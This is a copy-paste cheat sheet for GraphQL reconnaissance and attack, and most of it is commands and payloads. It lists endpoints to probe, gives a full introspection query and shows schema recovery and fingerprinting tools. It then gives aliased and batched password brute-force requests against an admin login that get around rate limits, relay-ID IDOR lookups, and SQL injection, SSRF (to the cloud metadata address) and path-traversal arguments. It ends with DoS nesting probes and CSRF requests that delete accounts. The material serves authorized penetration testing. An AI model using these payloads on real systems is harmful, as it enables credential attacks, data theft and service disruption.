---
title: "GraphQL Recon - Introspection, Clairvoyance, graphw00f, Batching"
category: web
subcategory: graphql
type: cheatsheet
tags: [graphql, introspection, __schema, clairvoyance, graphw00f, batching, alias, node-id, endpoints, field-suggestion, csrf, dos, inql, burp]
summary: "Copy-paste GraphQL recon: full introspection query, common endpoints, graphw00f/clairvoyance usage, alias/batch brute payloads, node IDOR, and DoS probes."
tools: [graphw00f, clairvoyance, inql, burp, curl]
related: [graphql-attacks, node-parameter-pollution]
---

## Endpoints to probe

```
/graphql          /graphiql         /v1/graphql       /v2/graphql
/api/graphql      /graphql/api      /graphql.php      /index.php?graphql
/query            /gql              /graphql/console  /console
/altair           /playground       /voyager          /subscriptions
/.netlify/functions/graphql         /admin/api        /shop/graphql
```

## Existence probe

```sh
# GET probe (also tests GET-based CSRF surface)
curl -sG 'https://t/graphql' --data-urlencode 'query={__typename}'
# POST probe
curl -s 'https://t/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# a valid endpoint returns {"data":{"__typename":"Query"}} or a GraphQL error
```

## Full introspection query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name
    ofType { kind name ofType { kind name ofType { kind name
      ofType { kind name } } } } } } }
}
```

```sh
# send it and pretty-print
curl -s https://t/graphql -H 'Content-Type: application/json' \
  --data-binary @introspection.json | python3 -m json.tool
```

## Partial probes (when full introspection is filtered)

```graphql
{ __schema { queryType { name } } }
{ __type(name:"Query") { name fields { name } } }
{ __type(name:"User") { name fields { name type { name kind } } } }
{ __typename }
```

## Clairvoyance (schema recovery via field suggestions)

```sh
# rebuilds the schema from "Did you mean" error messages when introspection is off
clairvoyance -o schema.json https://t/graphql
clairvoyance -w wordlist.txt -o schema.json https://t/graphql
# the suggestion oracle, by hand:
#   {aaaa}  ->  Cannot query field "aaaa" on type "Query". Did you mean "..."?
```

## graphw00f (engine fingerprint)

```sh
graphw00f -d -f -t https://t/graphql        # detect endpoint + fingerprint
graphw00f -f -t https://t/graphql
# detects: Apollo, graphql-js/express-graphql, Hasura, Graphene, Ariadne,
#   Sangria, Juniper, gqlgen, Absinthe, Lighthouse, graphql-ruby, Strawberry,
#   Dgraph, AWS AppSync, HyperGraphQL, WPGraphQL, Tartiflette, Directus
```

## Alias-based brute force (one HTTP request, many attempts)

```graphql
{
  a0: login(user:"admin", pass:"000000"){ token }
  a1: login(user:"admin", pass:"000001"){ token }
  a2: login(user:"admin", pass:"000002"){ token }
  # ... hundreds of aliases bypass per-request rate limits
}
```

```sh
# generate N aliases with a shell loop
python3 - <<'PY'
n=200
print("{\n"+"\n".join('a%d: login(user:"admin", pass:"%06d"){token}'%(i,i) for i in range(n))+"\n}")
PY
```

## Query batching (array of operations)

```json
[
 {"query":"mutation{login(user:\"admin\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"2\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"3\"){token}}"}
]
```

```sh
curl -s https://t/graphql -H 'Content-Type: application/json' -d @batch.json
# aliasing != batching: aliasing = one document ; batching = server toggle (Apollo on)
```

## node() / relay global-ID IDOR

```graphql
{ node(id: "VXNlcjox") { ... on User { id email role } } }   # base64("User:1")
```

```sh
# encode / decode relay ids
echo -n 'User:2' | base64          # -> VXNlcjoy
echo 'VXNlcjoy' | base64 -d        # -> User:2
```

## Injection through arguments

```graphql
{ user(id: "1' OR '1'='1") { name } }                 # SQLi
{ users(filter: {name: {_ilike: "%"}}) { email } }    # NoSQL (Hasura)
{ fetch(url: "http://169.254.169.254/latest/meta-data/") { body } }   # SSRF
{ file(path: "../../../../etc/passwd") { content } }   # path traversal
```

## DoS probes

```graphql
# deep nesting (adjust to defeat/confirm a depth limit)
{ a { b { a { b { a { b { a { b { id } } } } } } } } }
# circular fragment (rejected with "fragment cycles are not allowed" if guarded)
query { ...A }  fragment A on Query { ...B }  fragment B on Query { ...A }
# alias amplification
{ a0: __typename a1: __typename a2: __typename ... aN: __typename }
# directive overloading
{ user @include(if:true) @include(if:true) @skip(if:false) { id } }
```

## CSRF / transport

```sh
# GraphQL over GET -> CSRF if no token
curl -sG 'https://t/graphql' --data-urlencode 'query=mutation{deleteAccount}'
# form-encoded POST (simple request, no preflight)
curl -s https://t/graphql -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'query=mutation{deleteAccount}'
# text/plain also skips preflight
```

## Useful meta queries

```graphql
{ __schema { types { name } } }                    # all type names
{ __schema { mutationType { fields { name } } } }  # all mutations
{ __schema { queryType { fields { name args { name } } } } }
{ __type(name:"__Directive"){ name } }
```

## Tools

```sh
graphw00f -d -f -t <url>              # fingerprint
clairvoyance -o schema.json <url>     # schema recovery
inql -t <url>                          # Burp extension / CLI schema dump
python3 -m json.tool                   # pretty-print responses
```

## References

- PortSwigger Web Security Academy -- GraphQL API vulnerabilities.
- dolevf/graphw00f, nikitastupin/clairvoyance -- READMEs.
- Relay -- Global Object Identification spec.
- OWASP -- GraphQL Cheat Sheet.
